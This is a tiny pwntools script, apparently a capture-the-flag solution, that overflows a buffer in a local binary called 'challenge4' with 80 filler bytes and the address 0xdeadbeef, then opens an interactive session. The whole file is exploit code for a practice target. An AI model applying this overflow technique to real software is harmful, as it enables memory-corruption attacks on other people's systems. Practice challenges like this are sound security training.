from pwn import * 

p = process('./challenge4')
payload= b'A'*80+ p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
